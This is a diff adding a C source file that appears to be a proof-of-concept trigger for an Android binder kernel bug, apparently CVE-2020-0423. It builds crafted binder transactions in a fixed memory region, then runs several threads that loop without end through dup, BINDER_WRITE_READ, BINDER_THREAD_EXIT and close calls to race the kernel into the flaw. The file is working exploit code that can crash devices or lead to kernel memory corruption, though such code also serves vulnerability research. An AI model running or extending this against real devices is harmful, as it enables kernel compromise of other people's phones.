@@ -1,0 +1,118 @@
+#include "2020-0423.h" 
+#include "binder.h"
+/*
+ * Generates a binder transaction able to trigger the bug
+ */
+static inline void init_binder_transaction(int nb) {
+    /*
+     * Writes `nb` times a BINDER_TYPE_BINDER object in the object buffer
+     * and updates the offsets in the offset buffer accordingly
+     */
+
+    printf("[+] in generate bug binder func \n");
+    
+    for (int i = 0; i < nb; i++) {
+        struct flat_binder_object *fbo =
+            (struct flat_binder_object *)((void*)(MEM_ADDR + 0x400LL + i*sizeof(*fbo)));
+        fbo->hdr.type = BINDER_TYPE_BINDER;
+        fbo->binder = i;
+        fbo->cookie = i;
+        uint64_t *offset = (uint64_t *)((void *)(MEM_ADDR + OFFSETS_START + 8LL*i));
+        *offset = i * sizeof(*fbo);
+    }
+
+    /*
+     * Binder transaction data referencing the offset and object buffers
+     */
+    struct binder_transaction_data btd2 = {
+        .flags = TF_ONE_WAY, /* we don't need a reply */
+        .data_size = 0x28 * nb,
+        .offsets_size = 8 * nb,
+        .data.ptr.buffer = MEM_ADDR  + 0x400,
+        .data.ptr.offsets = MEM_ADDR + OFFSETS_START,
+    };
+
+    uint64_t txn_size = sizeof(uint32_t) + sizeof(btd2);
+
+    /* Transaction command */
+    *(uint32_t*)(MEM_ADDR + 0x200) = BC_TRANSACTION;
+    memcpy((void*)(MEM_ADDR + 0x204), &btd2, sizeof(btd2));
+
+    /* Binder write/read structure sent to binder */
+    struct binder_write_read bwr = {
+        .write_size = txn_size * (1), // 1 txno
+        .write_buffer = MEM_ADDR + 0x200
+    };
+    memcpy((void*)(MEM_ADDR + 0x100), &bwr, sizeof(bwr));
+    printf("[+] made binder transaction\n");
+}
+
+void *trigger_thread_func(void *argp) {
+    unsigned long id = (unsigned long)argp;
+    int ret = 0;
+    int binder_fd = -1;
+    int binder_fd_copy = -1;
+
+    // Opening binder device
+    binder_fd = open("/dev/binder", O_RDWR);
+    if (binder_fd < 0)
+        printf("An error occured while opening binder");
+
+    for (;;) {
+        // Refill the memory region with the transaction
+        init_binder_transaction(2);
+        printf("[+] in trigger bug func \n");
+        // Copying the binder fd
+        binder_fd_copy = dup(binder_fd);
+        
+        // Sending the transaction
+        ret = ioctl(binder_fd_copy, BINDER_WRITE_READ, MEM_ADDR + 0x100);
+        if (ret != 0)
+            printf("BINDER_WRITE_READ did not work: %d", ret);
+         printf("[+] sent binder transaction \n");
+        
+        // Binder thread exit
+        ret = ioctl(binder_fd_copy, BINDER_THREAD_EXIT, 0);
+        if (ret != 0)
+            printf("BINDER_WRITE_EXIT did not work: %d", ret);
+        printf("[+] exit binder thread\n");
+
+        ret = ioctl(binder_fd, BINDER_WRITE_READ, MEM_ADDR + 0x100);
+        if (ret != 0)
+            printf("BINDER_WRITE_READ did not work: %d", ret);
+        printf("[+] sent binder transaction2 \n");
+
+        // Closing binder device
+        close(binder_fd_copy);
+        printf("[+] close binder copy \n");
+
+    }
+
+    return NULL;
+}
+
+int main() {
+    pthread_t trigger_threads[NB_TRIGGER_THREADS];
+
+    // Memory region for binder transactions
+    mmap((void*)MEM_ADDR, MEM_SIZE, PROT_READ | PROT_WRITE,
+         MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
+
+    // Init random
+    srand(time(0));
+
+    // Get rid of stdout/stderr buffering
+    setvbuf(stdout, NULL, _IONBF, 0);
+    setvbuf(stderr, NULL, _IONBF, 0);
+
+    // Starting trigger threads
+    printf("Starting trigger threads");
+    for (unsigned long i = 0; i < NB_TRIGGER_THREADS; i++) {
+        pthread_create(&trigger_threads[i], NULL, trigger_thread_func, (void*)i);
+    }
+    // Waiting for trigger threads
+    for (int i = 0; i < NB_TRIGGER_THREADS; i++)
+        pthread_join(trigger_threads[i], NULL);
+
+    return 0;
+}
